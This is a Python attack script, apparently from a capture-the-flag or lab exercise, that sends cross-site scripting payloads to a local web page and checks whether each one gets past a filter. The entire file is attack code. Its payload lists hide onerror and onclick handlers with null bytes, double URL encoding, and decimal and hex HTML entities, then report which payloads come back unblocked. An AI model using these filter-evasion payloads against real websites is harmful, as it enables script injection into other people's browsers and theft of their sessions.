import requests
import urllib.parse

url = "http://127.0.0.1:33031/page"
param = "solution"

print("=" * 70)
print("STEP 2: Testing encoding bypasses for XSS")
print("=" * 70)

# Test 1: Null byte injection variations
print("\n[TEST GROUP 1: Null Byte Injection]")
null_payloads = [
    # Null in 'onerror'
    ("on%00error", '<img src=x on%00error=alert("XSS")>'), 
    ("o%00nerror", '<img src=x o%00nerror=alert("XSS")>'),
    ("onerr%00or", '<img src=x onerr%00or=alert("XSS")>'),
    ("onerror%00", '<img src=x onerror%00=alert("XSS")>'),
    # URL-encoded null
    ("on%2500error", '<img src=x on%2500error=alert("XSS")>'),  # Double-encoded
    ("o\\x00nerror", '<img src=x o\x00nerror=alert("XSS")>'),  # Raw null byte
]

for name, payload in null_payloads:
    data = {param: payload}
    try:
        resp = requests.post(url, data=data, timeout=10)
        status = resp.status_code
        # Check if alert can be triggered (looking for successful reflection without filter block)
        reflected = payload in resp.text or 'onerror' in resp.text or 'on%00error' in resp.text
        blocked = "TypeError" in resp.text or "blocked" in resp.text.lower() or "filter" in resp.text.lower()
        print(f"  {name}: Status={status}, Reflected={'YES' if reflected else 'NO'}, Blocked={'YES' if blocked else 'NO'}")
        if reflected and not blocked:
            print(f"    [+] Payload: {payload}")
            print(f"    [+] Response snippet: {resp.text[:300]}")
    except Exception as e:
        print(f"  {name}: ERROR - {e}")

# Test 2: HTML Entity Encoding (decimal)
print("\n[TEST GROUP 2: HTML Entity Encoding (Decimal)]")
# onerror = o(111) n(110) e(101) r(114) r(114) o(111) r(114)
onerror_decimal = "&#111;&#110;&#101;&#114;&#114;&#111;&#114;"
# onclick = c(99) l(108) i(105) c(99) k(107)
onclick_decimal = "&#99;&#108;&#105;&#99;&#107;"

decimal_payloads = [
    ("onerror_decimal", f'<img src=x {onerror_decimal}=alert("XSS")>'),
    ("onclick_decimal", f'<input type="button" {onclick_decimal}=alert("XSS")>'),
    ("tab_after_on", '<img src=x on&#101;&#114;&#114;&#111;&#114;=alert("XSS")>'),  # only "er" part
    ("decimal_mixed", '<img src=x onerror&#61;alert("XSS")>'),  # = in decimal
]

for name, payload in decimal_payloads:
    data = {param: payload}
    try:
        resp = requests.post(url, data=data, timeout=10)
        status = resp.status_code
        reflected = payload in resp.text or 'onerror' in resp.text or '&#111;&#110;' in resp.text
        blocked = "TypeError" in resp.text or "blocked" in resp.text.lower()
        print(f"  {name}: Status={status}, Reflected={'YES' if reflected else 'NO'}, Blocked={'YES' if blocked else 'NO'}")
        if reflected and not blocked:
            print(f"    [+] Payload: {payload}")
    except Exception as e:
        print(f"  {name}: ERROR - {e}")

# Test 3: HTML Entity Encoding (hex)
print("\n[TEST GROUP 3: HTML Entity Encoding (Hex)]")
# onerror in hex: o(6f) n(6e) e(65) r(72) r(72) o(6f) r(72)
onerror_hex = "&#x6f;&#x6e;&#x65;&#x72;&#x72;&#x6f;&#x72;"
# onclick in hex: c(63) l(6c) i(69) c(63) k(6b)
onclick_hex = "&#x63;&#x6c;&#x69;&#x63;&#x6b;"

hex_payloads = [
    ("onerror_hex", f'<img src=x {onerror_hex}=alert("XSS")>'),
    ("onclick_hex", f'<input type="button" {onclick_hex}=alert("XSS")>'),
    ("hex_uppercase", f'<img src=x &#x4F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;=alert("XSS")>'),  # uppercase O
]

for name, payload in hex_payloads:
    data = {param: payload}
    try:
        resp = requests.post(url, data=data, timeout=10)
        status = resp.status_code
        reflected = payload in resp.text or 'onerror' in resp.text or '&#x6f;&#x6e;' in resp.text
        blocked = "TypeError" in resp.text or "blocked" in resp.text.lower()
        print(f"  {name}: Status={status}, Reflected={'YES' if reflected else 'NO'}, Blocked={'YES' if blocked else 'NO'}")
        if reflected and not blocked:
            print(f"    [+] Payload: {payload}")
    except Exception as e:
        print(f"  {name}: ERROR - {e}")
